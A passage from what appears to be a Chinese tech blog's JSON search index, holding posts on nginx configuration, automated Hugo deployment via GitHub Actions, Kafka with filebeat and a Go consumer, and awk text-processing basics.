index.htm，如果没有开启目录浏览权限，又找不到这些默认首页，就会报403错误。\n\n  \n\nlocation 还有一种方式就是正则匹配，开启正则匹配这样：`location ~`。后面加个`~`。下面这个例子是运用`正则匹配`来链接php。\n\n```nginx\nlocation ~ \\.php$ {\n            root           /home/levonfly/www;\n            fastcgi_pass   127.0.0.1:9000;\n            fastcgi_index  index.php;\n            include        fastcgi.conf;\n        }\n```\n\n`\\.php$` 熟悉正则的我们直到，这是匹配`.php`结尾的URL，用来解析php文件。里面的`root`也是一样，用来表示虚拟主机的根目录。 \n`fast_pass`链接的是`php-fpm` 的地址，之前我们也搭建过。其他几个参数我们以后再说。\n\n\n\n### 3.6 upstream 模块(http子模块)\n\nupstream 模块负债负载均衡模块，通过一个简单的调度算法来实现客户端IP到后端服务器的负载均衡。我先学习怎么用，具体的使用实例以后再说。\n\n```nginx\nupstream liuvv.com{\n     ip_hash;\n     server 192.168.12.1:80;\n     server 192.168.12.2:80 down;\n     server 192.168.12.3:8080  max_fails=3  fail_timeout=20s;\n     server 192.168.12.4:8080;\n}\n```\n\n在上面的例子中，通过upstream指令指定了一个负载均衡器的名称liuvv.com。这个名称可以任意指定，在后面需要的地方直接调用即可。\n\n\n\n里面是ip_hash这是其中的一种负载均衡调度算法，下面会着重介绍。紧接着就是各种服务器了。用server关键字表识，后面接ip。\n\nNginx的负载均衡模块目前支持4种调度算法:\n\n1. weight 轮询（默认）。每个请求按时间顺序逐一分配到不同的后端服务器，如果后端某台服务器宕机，故障系统被自动剔除，使用户访问不受影响。weight。指定轮询权值，weight值越大，分配到的访问机率越高，主要用于后端每个服务器性能不均的情况下。\n2. ip_hash。每个请求按访问IP的hash结果分配，这样来自同一个IP的访客固定访问一个后端服务器，有效解决了动态网页存在的session共享问题。\n3. fair。比上面两个更加智能的负载均衡算法。此种算法可以依据页面大小和加载时间长短智能地进行负载均衡，也就是根据后端服务器的响应时间来分配请求，响应时间短的优先分配。Nginx本身是不支持fair的，如果需要使用这种调度算法，必须下载Nginx的upstream_fair模块。\n4. url_hash。按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，可以进一步提高后端缓存服务器的效率。Nginx本身是不支持url_hash的，如果需要使用这种调度算法，必须安装Nginx 的hash软件包。\n\n\n\n在HTTP Upstream模块中，可以通过server指令指定后端服务器的IP地址和端口，同时还可以设定每个后端服务器在负载均衡调度中的状态。常用的状态有：\n\n- down，表示当前的server暂时不参与负载均衡。\n- backup，预留的备份机器。当其他所有的非backup机器出现故障或者忙的时候，才会请求backup机器，因此这台机器的压力最轻。\n- max_fails，允许请求失败的次数，默认为1。当超过最大次数时，返回proxy_next_upstream 模块定义的错误。\n- fail_timeout，在经历了max_fails次失败后，暂停服务的时间。max_fails可以和fail_timeout一起使用。\n\n**注意** 当负载调度算法为ip_hash时，后端服务器在负载均衡调度中的状态不能是weight和backup。\n\n\n\n# 四. nginx 配置实战\n\n### 4.1 nginx指令\n\n```\nnginx -s signal\n```\n\nWhere *signal* may be one of the following:\n\n- stop — fast shutdown\n- quit — graceful shutdown\n- reload — reloading the configuration file\n- reopen — reopening the log files\n\n\n\n### 4.2 nginx 快速配置教程\n\nhttps://nginx.org/en/docs/beginners_guide.html\n\n##### 4.2.1 如果有多个location模块, 匹配最长的\n\n```nginx\n    location / {\n            root /home/levonfly/www;\t#http://test.liuvv.com/\n    }\n\n    location /images/ { # 路径是两者相加/home/levonfly/images/\n            root /home/levonfly;\t#http://test.liuvv.com/images/1.png\n    }\n```\n\n##### 4.2.2 一个nginx实例可以通过listen监听不同端口\n\n```nginx\nserver {\n    listen 8080;\n    root /home/levonfly/8080;  # location没有root, 就用这里的root, 继承关系\n\n    location / {\n    }\n}\n\nserver {\n        listen 80;\n        server_name *.liuvv.com;\n        location / {\n                proxy_pass http://localhost:8080;\n        }\n        location /images/ {   \n                root /home/levonfly/; # http://test.liuvv.com/images/1.png\n        }\n  \n  \t    #location ~ \\.(gif|jpg|png)$ {  # 1.判断后缀 2. 波浪线是正则\n        #        root /home/levonfly/images; # http://test.liuvv.com/1.png\n        #}\n}\n```\n\n##### 4.2.3 fastcgi方式\n\nnginx本身不能处理php，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。nginx一般是把请求发fastcgi管理进程处理，fascgi管理进程选择cgi子进程处理结果并返回给nginx. php-fpm是一个php fastcgi管理器, 目前直接集成在php中.\n\n\n\n安装php:\n\n```bash\nsudo apt install php\nsudo systemctl restart php7.0-fpm.service\n```\n\nnginx配置:\n\n```nginx\nserver {\n        listen 80;\n        server_name *.liuvv.com;\n        root /home/levonfly/www;\n        index index.php index.html index.htm;\n  \n        location ~* \\.php$ {\n                fastcgi_pass unix:/run/php/php7.0-fpm.sock;\n                include         fastcgi_params;\n                fastcgi_param   SCRIPT_FILENAME    $document_root$fastcgi_script_name;\n                fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;\n        }\n}\n```\n\n### 4.3 虚拟主机配置\n\nnginx 使用域名，主要是使用`server`模块下的` server_name`选项。\n\n参考: http://www.liuvv.com/p/d039.html\n\n### 4.4 URL路由重写\n\nnginx 使用url 重写，主要是使用`server`模块下的` location`模块。\n\n参考: http://www.liuvv.com/p/51e59d76.html\n\n### 4.5 反向代理配置\n\nnginx 使用反向代理，主要是使用 `server`模块下 `location`模块下的`proxy_pass`选项。\n\n参考: http://www.liuvv.com/p/51e59d76.html\n\n### 4.6 负载均衡配置\n\nnginx 使用反向代理，主要是使用`upstream`模块(和server 平级)。\n\n参考: https://www.liuvv.com/p/4c38afcc.html\n\n\n\n# 五. 参考资料\n\n+ nginx的配置、虚拟主机、负载均衡和反向代理\n\n  https://www.zybuluo.com/phper/note/89391  \n\n  https://www.zybuluo.com/phper/note/90310  \n\n  https://www.zybuluo.com/phper/note/133244  \n\n+ nginx 配置详解\n\n  https://my.oschina.net/duxuefeng/blog/34880\n\n  http://www.nginx.cn/591.html \n\n  https://jkzhao.github.io/2018/01/23/Nginx%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E5%8F%8A%E4%BC%98%E5%8C%96 \n\n  https://www.kancloud.cn/curder/nginx/96672 \n\n+ 在线生成nginx 配置\n\n   https://nginxconfig.io\n   \n+ nginx 优秀教程\n\n   https://xuexb.github.io/learn-nginx/example/  \n\n   https://www.kancloud.cn/hfpp2012/nginx-tutorial/467009\n","tags":["nginx"],"categories":["nginx"]},{"title":"hugo博客自动化部署到github和云服务器上","url":"%2Fp%2F35554ffc.html","content":"\n新的博客系统准备使用hugo,  更想专注于写, 而不是写完每次都敲命令部署, 接下来搞下自动化部署.\n\n另外blog要实现国内外分流进行加速,  国外去访问github page, 国内访问cdn, 或者自己的云服务器上(双十一撸的一直在吃灰)\n\n<!-- more -->\n\n# 1. github page 自动部署\n\n### 1.1 gh-pages 分支\n\ngithub 项目新建 gh-pages 分支后, 会自动部署github page上, 所以利用这个特性, 把生成的静态文件提交到 ` gh-pages` 分支上.\n\n+ 创建`gh-pages`分支\n\n```bash\n# 初始化gh-pages branch\ngit checkout --orphan gh-pages\ngit reset --hard\ngit commit --allow-empty -m \"Initializing gh-pages branch\"\ngit push origin gh-pages\ngit checkout master\n```\n\n\n+ deploy.sh\n\n```shell\n#!/bin/sh\n\n# 删除public文件夹\nrm -rf public\nmkdir public\nrm -rf .git/worktrees/public/\ngit worktree add -B gh-pages public origin/gh-pages\nrm -rf public/*\necho \"Generating site\"\nhugo -D\n\n\n# 放入CNAME\necho \"www.realhttp.com\" > public/CNAME\n\n\n# 提交信息\necho \"Updating gh-pages branch\"\nmsg=\"rebuilding site `date`\"\nif [ $# -eq 1 ]\n          then msg=\"$1\"\nfi\ncd public && git add --all && git commit -m \"$msg\"\n\n\n# 推送到 gh-pages 分支\necho \"Push to origin gh-pages\"\ngit pull origin gh-pages\ngit push origin gh-pages\ncd .. && rm -rf public\n```\n\n每次写完blog, 运行一下脚本即可\n\n\n\n### 1.2 github action 配置\n\n第一种方案, 提交文章后还要执行一次脚本, 通过github action, 可以做到提交文章自动部署, 即CI/CD\n\n+ hugo主题\n\n  hugo的主题, 尽量保证是git submodule维护的\n\n  ```bash\n  git submodule add https://github.com/g1eny0ung/hugo-theme-dream.git themes/dream\n  ```\n\n  look一下\n\n  ```ini\n  cat .gitmodules\n  \n  [submodule \"themes\"]\n          path = themes/dream\n          url = https://github.com/g1eny0ung/hugo-theme-dream.git\n  ```\n\n  \n\n+ 编写github action\n\n  去项目的`Actions`增加自己的workflow\n  \n  ![1](hugo博客自动化部署到github和云服务器上/1.png)\n\n  内容如下:\n\n    ```yml\n    name: github pages\n  \n    on:\n      push:\n        branches:\n          - master  # 这里是提交到master分支就立即触发job\n      pull_request:\n  \n    jobs:\n      deploy:\n        runs-on: ubuntu-18.04\n        steps:\n          - uses: actions/checkout@v2\n            with:\n              submodules: true  # Fetch Hugo themes (true OR recursive)\n              fetch-depth: 0    # Fetch all history for .GitInfo and .Lastmod\n  \n          - name: Setup Hugo\n            uses: peaceiris/actions-hugo@v2\n            with:\n              hugo-version: '0.83.1'\n  \n          - name: Build\n            run: hugo --minify\n  \n          - name: Deploy\n            uses: peaceiris/actions-gh-pages@v3\n            with:\n              github_token: ${{ secrets.GITHUB_TOKEN }}  # 这里不用动, 默认就好\n              publish_dir: ./public  # 注意是hugo的public文件夹\n              cname: www.realhttp.com # cname\n    ```\n\n\n\n# 2. 云服务器自动部署\n\n### 2.1 国内外分流\n\n首先先设置国内外分流, 就要求同一个域名, 不同的线路指向不同的地址: 如下图\n\n![1](hugo博客自动化部署到github和云服务器上/2.png)\n![1](hugo博客自动化部署到github和云服务器上/3.png)\n\n境内我指向了我的云服务器, 境外我指向了`github page`, 国外github已经帮我们处理好了, 接下来需要处理一下国内的访问.\n\n\n\n### 2.2 国内nginx配置\n\n国内访问域名已经实现了访问云服务器, 这时候需要配置nginx访问到相应的静态资源.\n\n```nginx\nserver {\n    listen 80;\n    listen [::]:80;\n    server_name realhttp.com www.realhttp.com;\n    return 301 https://www.realhttp.com$request_uri;\n}\n\nserver {\n  listen 443 ssl;\n  listen [::]:443 ssl;\n  server_name realhttp.com www.realhttp.com;\n\n  ssl_certificate /etc/nginx/ssl/realhttp/1_www.realhttp.com_bundle.crt;\n  ssl_certificate_key /etc/nginx/ssl/realhttp/2_www.realhttp.com.key;\n  ssl_session_timeout 5m;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;\n  ssl_prefer_server_ciphers on;\n\n  root   /var/www/hugo/;\n  location / {\n          index  index.html index.htm;\n  }\n}\n```\n\n静态资源放在了`/var/www/hugo/` 下, 接下来需要通过`github action` 自动把生成的静态资源部署到云服务器该文件夹内.\n\n\n\n### 2.3 github action配置\n\n因为需要部署到云服务, 所以需要github通过私钥有访问服务器的权限, 需要在项目里加上私钥和服务器ip. \n\n在项目->Settings->Secrets, 添加相应的变量\n\n![1](hugo博客自动化部署到github和云服务器上/4.png)\n\n+ github action 配置如下\n\n```yml\n name: github pages\n\n  on:\n    push:\n      branches:\n        - master  # 这里是提交到master分支就立即触发job\n    pull_request:\n\n  jobs:\n    deploy:\n      runs-on: ubuntu-18.04\n      steps:\n        - uses: actions/checkout@v2\n          with:\n            submodules: true  # Fetch Hugo themes (true OR recursive)\n            fetch-depth: 0    # Fetch all history for .GitInfo and .Lastmod\n\n        - name: Setup Hugo\n          uses: peaceiris/actions-hugo@v2\n          with:\n            hugo-version: '0.83.1'\n\n        - name: Build\n          run: hugo --minify\n\n        - name: Deploy Github\n          uses: peaceiris/actions-gh-pages@v3\n          with:\n            github_token: ${{ secrets.GITHUB_TOKEN }}  # 这里不用动, 默认就好\n            publish_dir: ./public  # 注意是hugo的public文件夹\n            cname: www.realhttp.com # cname\n   \n        - name: Deploy Tencent Cloud\n          uses: wlixcc/SFTP-Deploy-Action@v1.2.1 \n          with:  \n            username: 'root'   #ssh user name\n            server: '${{ secrets.SERVER_IP }}' #引用之前创建好的secret\n            ssh_private_key: ${{ secrets.SSH_PRIVATE_KEY }} #引用之前创建好的secret\n            local_path: './public/*'  # 对应我们项目public的文件夹路径\n            remote_path: '/var/www/hugo' # 对应云上的目录\n```\n\n在项目的`Actions`下可以看到相应的执行状态:\n\n![1](hugo博客自动化部署到github和云服务器上/5.png)\n\n# 3. 参考资料\n\n+ https://github.com/peaceiris/actions-hugo\n+ https://zhuanlan.zhihu.com/p/37752930\n+ https://zhuanlan.zhihu.com/p/107545396","tags":["博客"],"categories":["博客"]},{"title":"filebeat输出到kafka","url":"%2Fp%2F944e7ab5.html","content":"\n# 1. kafka\n\n### 1.1 安装\n\n+ kafka_2.13-2.8.0.tgz ,   前面的版本号是编译 Kafka 源代码的 Scala 编译器版本, 真正的版本号是2.8.0\n\n```bash\nwget https://mirrors.bfsu.edu.cn/apache/kafka/2.8.0/kafka_2.13-2.8.0.tgz\ntar -xzf kafka_2.13-2.8.0.tgz \ncd kafka_2.13-2.8.0\n```\n\n<!-- more -->\n\n+ 启动\n\n```bash\n# 一个终端\nbin/zookeeper-server-start.sh config/zookeeper.properties\n\n# 另外一个终端\nbin/kafka-server-start.sh config/server.properties\n```\n\n\n\n+ 安装 java\n\n  报错: /root/kafka_2.13-2.8.0/bin/kafka-run-class.sh: line 330: exec: java: not found\n  Your local environment must have Java 8+ installed.\n\n```bash\napt install openjdk-11-jre-headless\njava --version\n```\n\n\n\n### 1.2 systemctl 服务\n\nhttps://gist.github.com/vipmax/9ceeaa02932ba276fa810c923dbcbd4f\n\n`vi /etc/systemd/system/kafka-zookeeper.service`\n\n```ini\n[Unit]\nDescription=Apache Zookeeper server (Kafka)\nDocumentation=http://zookeeper.apache.org\nRequires=network.target remote-fs.target\nAfter=network.target remote-fs.target\n[Service]\nType=simple\nExecStart=/data/tools/kafka-worth/bin/zookeeper-server-start.sh /data/tools/kafka-worth/config/zookeeper.properties\nExecStop=/data/tools/kafka-worth/bin/zookeeper-server-stop.sh\n[Install]\nWantedBy=multi-user.target\n```\n\n\n\n`vi /etc/systemd/system/kafka.service`\n\n```ini\n[Unit]\nDescription=Apache Kafka server (broker)\nDocumentation=http://kafka.apache.org/documentation.html\nRequires=network.target remote-fs.target\nAfter=network.target remote-fs.target kafka-zookeeper.service\n[Service]\nType=simple\nExecStart=/opt/kafka/bin/kafka-server-start.sh /opt/kafka/config/server.properties\nExecStop=/opt/kafka/bin/kafka-server-stop.sh\n[Install]\nWantedBy=multi-user.target\n```\n\n+ 启动\n\n```bash\nsystemctl daemon-reload\nsystemctl start kafka-zookeeper.service\nsystemctl start kafka.service\n```\n\n\n\n### 1.3 kafka 使用\n\n+ 创建一个 topic.\n\n  ```bash\n  bin/kafka-topics.sh --create --topic pingback --bootstrap-server localhost:9092\n  \n  # 删除topic\n  bin/kafka-topics.sh --delete --topic pingback --bootstrap-server localhost:9092\n  ```\n\n+ 显示\n\n  ```bash\n  # 显示所有 topics\n  bin/kafka-topics.sh --list --bootstrap-server localhost:9092 \n  \n  \n  # 显示特定 topic 属性\n  bin/kafka-topics.sh --describe --topic pingback --bootstrap-server localhost:9092\n  ```\n\n\n+ 看组\n  \n  ```bash\n  # 显示所有组\n  bin/kafka-consumer-groups.sh  --list --bootstrap-server localhost:9092\n  \n  \n  # 看特定组的消费情况\n  bin/kafka-consumer-groups.sh --describe --group test-consumer-group --bootstrap-server localhost:9092\n  ```\n  \n+ 生产\n  \n  ```bash\n  bin/kafka-console-producer.sh --topic pingback --bootstrap-server localhost:9092\n  #>This is my first event\n  #>This is my second event\n  #You can stop the producer client with Ctrl-C at any time.\n  ```\n\n\n+ 消费\n\n  ```bash\n  bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic pingback\n  bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic pingback --from-beginning --group test-consumer-group\n  \n  #This is my first event\n  #This is my second event\n  #You can stop the consumer client with Ctrl-C at any time.\n  ```\n  \n  \n  \n+ 重置offset\n\n  ```bash\n  # 回到最早该消费的点\n  bin/kafka-consumer-groups.sh --group test-consumer-group --bootstrap-server localhost:9092 --reset-offsets --to-earliest --all-topics --execute\n  \n  # 重置到特定的 offset\n  bin/kafka-consumer-groups.sh --group test-consumer-group --bootstrap-server localhost:9092 --reset-offsets --topic pingback:0 --to-offset 123 --execute\n  ```\n\n  提交过offset，latest和earliest没有区别，但是在没有提交offset情况下，用latest直接会导致无法读取旧数据。\n\n\n+ 删除数据\n\n  ```bash\n  # 清理数据\n  1. bin/kafka-configs.sh --bootstrap-server localhost:9092 --entity-type topics --entity-name pingback --alter --add-config retention.ms=1000\n  2. bin/kafka-configs.sh --bootstrap-server localhost:9092 --entity-type topics --entity-name pingback --alter --delete-config retention.ms\n  \n  # 重置最初\n  ```\n\n\n\n\n### 1.4 配置\n\n##### 1.4.1 kafka支持远程访问\n\n打开config/server.properties配置文件，更改如下\n\n把31行的注释去掉，listeners=PLAINTEXT://:9092\n把36行的注释去掉，把advertised.listeners值改为PLAINTEXT://host_ip:9092\n\n\n\n##### 1.4.2 修改 log 路径\n\nKafka的data目录是存储Kafka的数据文件的目录，是在${KAFKA_HOME}/config/server.properties中修改\n\n```bash\nlog.dirs=/data/kafka_data\n```\n\n注意：log.dirs可以配置多个目录，需要用逗号分隔开\n\n\n\n##### 1.4.3 周期删除数据\n\nsudo vi config/server.properties\n\n``` bash\nlog.retention.minutes=3\nlog.retention.hours=1  # 选一个\nlog.cleanup.policy=delete\n```\n\n\n\n# 2. filebeat\n\n### 2.1 安装\n\n```bash\nwget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.12.1-linux-x86_64.tar.gz\ntar zxvf filebeat-7.12.1-linux-x86_64.tar.gz\ncd filebeat-7.12.1-linux-x86_64/\n```\n\n\n\n### 2.2 filebeat.yml\n\n```ini\nfilebeat.inputs:\n- type: log\n  enabled: true\n  paths:\n      - /DATA/log/nginx/pb_ptio.access.log\n  fields:\n        document_type: online-pingback\n\n\noutput.kafka:\n  hosts: [\"localhost:9092\"]\n  topic: 'pingback'\n  partition.round_robin:\n    reachable_only: false\n  compression: gzip\n\n\nprocessors:\n  - decode_json_fields:\n      fields: ['message']\n      target: \"\"\n      overwrite_keys: false\n      process_array: false\n      max_depth: 1\n  - decode_json_fields:\n      fields: ['request_body']\n      target: \"\"\n      overwrite_keys: false\n      process_array: false\n      max_depth: 3\n  - drop_fields:\n      fields: [\"message\"]\n```\n\n\n\n### 2.3 systemctl 服务\n\n`vi /etc/systemd/system/filebeat.service`\n\n```ini\n[Unit]\nDescription=filebeat\nAfter=network.target\n[Service]\nType=simple\nRestart=yes\nExecStart=/opt/filebeat/filebeat -e -c /opt/filebeat/filebeat.yml\n[Install]\nWantedBy=multi-user.target\n```\n\n+ 启动\n\n  ```bash\n  systemctl start filebeat\n  ```\n\n\n\n# 3. golang 读取 kafka\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"flag\"\n\t\"log\"\n\t\"os\"\n\t\"os/signal\"\n\t\"strings\"\n\t\"sync\"\n\t\"syscall\"\n\n\t\"github.com/Shopify/sarama\"\n)\n\n// Sarama configuration options\nvar (\n\tbrokers  = \"\"\n\tversion  = \"\"\n\tgroup    = \"\"\n\ttopics   = \"\"\n\tassignor = \"\"\n\toldest   = true\n\tverbose  = false\n)\n\nfunc init() {\n\tflag.StringVar(&brokers, \"brokers\", \"\", \"Kafka bootstrap brokers to connect to, as a comma separated list\")\n\tflag.StringVar(&group, \"group\", \"\", \"Kafka consumer group definition\")\n\tflag.StringVar(&version, \"version\", \"2.1.1\", \"Kafka cluster version\")\n\tflag.StringVar(&topics, \"topics\", \"\", \"Kafka topics to be consumed, as a comma separated list\")\n\tflag.StringVar(&assignor, \"assignor\", \"range\", \"Consumer group partition assignment strategy (range, roundrobin, sticky)\")\n\tflag.BoolVar(&oldest, \"oldest\", true, \"Kafka consumer consume initial offset from oldest\")\n\tflag.BoolVar(&verbose, \"verbose\", false, \"Sarama logging\")\n\tflag.Parse()\n\n\tif len(brokers) == 0 {\n\t\tpanic(\"no Kafka bootstrap brokers defined, please set the -brokers flag\")\n\t}\n\n\tif len(topics) == 0 {\n\t\tpanic(\"no topics given to be consumed, please set the -topics flag\")\n\t}\n\n\tif len(group) == 0 {\n\t\tpanic(\"no Kafka consumer group defined, please set the -group flag\")\n\t}\n}\n\nfunc main() {\n\tlog.Println(\"Starting a new Sarama consumer\")\n\n\tif verbose {\n\t\tsarama.Logger = log.New(os.Stdout, \"[sarama] \", log.LstdFlags)\n\t}\n\n\tversion, err := sarama.ParseKafkaVersion(version)\n\tif err != nil {\n\t\tlog.Panicf(\"Error parsing Kafka version: %v\", err)\n\t}\n\n\t/**\n\t * Construct a new Sarama configuration.\n\t * The Kafka cluster version has to be defined before the consumer/producer is initialized.\n\t */\n\tconfig := sarama.NewConfig()\n\tconfig.Version = version\n\n\tswitch assignor {\n\tcase \"sticky\":\n\t\tconfig.Consumer.Group.Rebalance.Strategy = sarama.BalanceStrategySticky\n\tcase \"roundrobin\":\n\t\tconfig.Consumer.Group.Rebalance.Strategy = sarama.BalanceStrategyRoundRobin\n\tcase \"range\":\n\t\tconfig.Consumer.Group.Rebalance.Strategy = sarama.BalanceStrategyRange\n\tdefault:\n\t\tlog.Panicf(\"Unrecognized consumer group partition assignor: %s\", assignor)\n\t}\n\n\tif oldest {\n\t\tconfig.Consumer.Offsets.Initial = sarama.OffsetOldest\n\t}\n\n\t/**\n\t * Setup a new Sarama consumer group\n\t */\n\tconsumer := Consumer{\n\t\tready: make(chan bool),\n\t}\n\n\tctx, cancel := context.WithCancel(context.Background())\n\tclient, err := sarama.NewConsumerGroup(strings.Split(brokers, \",\"), group, config)\n\tif err != nil {\n\t\tlog.Panicf(\"Error creating consumer group client: %v\", err)\n\t}\n\n\twg := &sync.WaitGroup{}\n\twg.Add(1)\n\tgo func() {\n\t\tdefer wg.Done()\n\t\tfor {\n\t\t\t// `Consume` should be called inside an infinite loop, when a\n\t\t\t// server-side rebalance happens, the consumer session will need to be\n\t\t\t// recreated to get the new claims\n\t\t\tif err := client.Consume(ctx, strings.Split(topics, \",\"), &consumer); err != nil {\n\t\t\t\tlog.Panicf(\"Error from consumer: %v\", err)\n\t\t\t}\n\t\t\t// check if context was cancelled, signaling that the consumer should stop\n\t\t\tif ctx.Err() != nil {\n\t\t\t\treturn\n\t\t\t}\n\t\t\tconsumer.ready = make(chan bool)\n\t\t}\n\t}()\n\n\t<-consumer.ready // Await till the consumer has been set up\n\tlog.Println(\"Sarama consumer up and running!...\")\n\n\tsigterm := make(chan os.Signal, 1)\n\tsignal.Notify(sigterm, syscall.SIGINT, syscall.SIGTERM)\n\tselect {\n\tcase <-ctx.Done():\n\t\tlog.Println(\"terminating: context cancelled\")\n\tcase <-sigterm:\n\t\tlog.Println(\"terminating: via signal\")\n\t}\n\tcancel()\n\twg.Wait()\n\tif err = client.Close(); err != nil {\n\t\tlog.Panicf(\"Error closing client: %v\", err)\n\t}\n}\n\n// Consumer represents a Sarama consumer group consumer\ntype Consumer struct {\n\tready chan bool\n}\n\n// Setup is run at the beginning of a new session, before ConsumeClaim\nfunc (consumer *Consumer) Setup(sarama.ConsumerGroupSession) error {\n\t// Mark the consumer as ready\n\tclose(consumer.ready)\n\treturn nil\n}\n\n// Cleanup is run at the end of a session, once all ConsumeClaim goroutines have exited\nfunc (consumer *Consumer) Cleanup(sarama.ConsumerGroupSession) error {\n\treturn nil\n}\n\n// ConsumeClaim must start a consumer loop of ConsumerGroupClaim's Messages().\nfunc (consumer *Consumer) ConsumeClaim(session sarama.ConsumerGroupSession, claim sarama.ConsumerGroupClaim) error {\n\t// NOTE:\n\t// Do not move the code below to a goroutine.\n\t// The `ConsumeClaim` itself is called within a goroutine, see:\n\t// https://github.com/Shopify/sarama/blob/master/consumer_group.go#L27-L29\n\tfor message := range claim.Messages() {\n\t\tlog.Printf(\"Message claimed: value = %s, timestamp = %v, topic = %s\", string(message.Value), message.Timestamp, message.Topic)\n\t\tsession.MarkMessage(message, \"\")\n\t}\n\n\treturn nil\n}\n```\n\n\n\n# 4. 参考资料\n\n+ https://www.liuvv.com/p/f03714cc.html\n+ https://blog.csdn.net/u010889616/article/details/80640330\n+ https://birdben.github.io/2016/12/15/Kafka/Kafka%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89%E6%8C%87%E5%AE%9AKafka%E7%9A%84data%E5%92%8Clogs%E8%B7%AF%E5%BE%84/\n+ https://blog.csdn.net/qq_41926119/article/details/104510481\n+ https://github.com/Shopify/sarama\n","tags":["filebeat"],"categories":["elk"]},{"title":"awk的使用","url":"%2Fp%2Feb6cbd19.html","content":"\nAWK 是一种处理文本文件的编程语言，是一个强大的文本分析工具。之所以叫 AWK 是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的 Family Name 的首字符。\n\ngrep 、sed、awk 被称为 linux 中的”三剑客”。grep 更适合单纯的查找或匹配文本， sed 更适合编辑匹配到的文本， awk 更适合格式化文本，对文本进行较复杂格式处理。\n\n<!-- more -->\n\n# 1. 使用\n\n### 1.1 分割字符\n\n```bash\necho 'this is a test' | awk '{print $0}'\n\nthis is a test\n```\n\nprint 是打印命令，$0 代表当前行全部字段。上面代码中，`print $0` 就是把标准输入 `this is a test`，重新打印了一遍。\n\nawk 会根据空格和制表符，将每一行分成若干字段，依次用 $1、$2、$3 代表第一个字段、第二个字段、第三个字段等等。\n\n```bash\necho 'this is a test' | awk '{print $3}'\n\na\n```\n\n下面，为了便于举例，我们把/etc/passwd 文件保存成 demo.txt。\n\n```json\nroot:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\n```\n\n这个文件的字段分隔符是冒号（:），所以要用 -F 参数指定分隔符为冒号。然后，才能提取到它的第一个字段。\n\n```bash\nawk -F ':' '{ print $1 }' demo.txt\nawk -v FS=':' '{print $1}' demo.txt\ncat demo.txt  | awk -F ':' '{print $1}'\n\n\nroot\ndaemon\nbin\nsys\nsync\n```\n\n### 1.2 变量使用\n\n##### 1.2.1 NF 字段\n\n变量 NF 表示当前行有多少个字段，因此 **$NF 就代表最后一个字段**。\n\n```bash\n\n# 输出倒数第一个字段\necho 'this is a test' | awk '{print $NF}'\ntest\n\n# 输出倒数第二个字段\necho 'this is a test' | awk '{print $(NF-1)}'\na\n\n# print 命令里面的逗号，表示输出的时候，两个部分之间使用空格分隔。\nawk -F ':' '{print $1, $(NF-1)}' demo.txt\nroot /root\ndaemon /usr/sbin\nbin /bin\nsys /dev\nsync /bin\n```\n\n##### 1.2.2 NR 行\n\n变量 NR 表示当前处理的是第几行。\n\n```bash\n# print 命令里面，如果原样输出字符，要放在双引号里面。\nawk -F ':' '{print NR \") \" $1}' demo.txt\n\n\n1) root\n2) daemon\n3) bin\n4) sys\n5) sync\n```\n\n##### 1.2.3 常用内置变量\n\n```json\nFILENAME：当前文件名\nFS：字段分隔符，默认是空格和制表符。\nRS：行分隔符，用于分割每一行，默认是换行符。\nOFS：输出字段的分隔符，用于打印时分隔字段，默认为空格。\nORS：输出记录的分隔符，用于打印时分隔记录，默认为换行符。\nOFMT：数字输出的格式，默认为％.6g。\n```\n\n### 1.3 函数使用\n\n##### 1.3.1 Toupper\n\n```bash\n# 函数 `toupper()` 用于将字符转为大写。\nawk -F ':' '{ print toupper($1) }' demo.txt\n\nROOT\nDAEMON\nBIN\nSYS\nSYNC\n```\n\n##### 1.3.2 常用内置函数\n\n```json\n//常用函数：\ntolower()：字符转为小写。\nlength()：返回字符串长度。\nsubstr()：返回子字符串。\nsin()：正弦。\ncos()：余弦。\nsqrt()：平方根。\nrand()：随机数。\n```\n\n### 1.4 条件使用\n\n`awk` 允许指定输出条件，只输出符合条件的行。输出条件要写在动作的前面。\n\n```bash\nawk '条件 动作' 文件名\n```\n\n```bash\n# print 命令前面是一个正则表达式，只输出包含 usr 的行。\nawk -F ':' '/usr/ {print $1}' demo.txt  \n\nroot\ndaemon\nbin\nsys\n\n\n# 输出奇数行\nawk -F ':' 'NR % 2 == 1 {print $1}' demo.txt \n\nroot\nbin\nsync\n\n# 输出第三行以后的行\nawk -F ':' 'NR >3 {print $1}' demo.txt \n\nsys\nsync\n\n# 输出第一个字段等于指定值的行。\nawk -F ':' '$1 == \"root\" || $1 == \"bin\" {print $0}' demo.txt\n\nroot:x:0:0:root:/root:/bin/bash\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n\n```\n\n### 1.5 If 语句\n\nawk 提供了 if 结构，用于编写复杂的条件。\n\n```bash\n# 输出第一个字段的第一个字符大于`m`的行。\nawk -F ':' '{if ($1 > \"m\") print $1}' demo.txt\n\nroot\nsys\nsync\n\n\n# `if`结构还可以指定`else`部分。\nawk -F ':' '{if ($1 > \"m\") print $1; else print \"---\"}' demo.txt\n\nroot\n---\n---\nsys\nsync\n```\n\n### 1.6 循环使用\n\nEND 的意思是“处理完所有的行的标识”，除了 END 还有 BEGIN，这两个关键字意味着执行前和执行后的意思，语法如下：\n\n```bash\n# 计算多个文件的大小\nls -l  *.log\n-rw-rw-r-- 1 web web 42487 Nov 12  2021 openfiles1111.log\n-rw-rw-r-- 1 web web  2690 Nov 12  2021 openfiles1112.log\n\n\nls -l  *.log | awk '{sum+=$5} END {print sum}'\n45177\n\n\n\n# 循环计算内存\nps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME 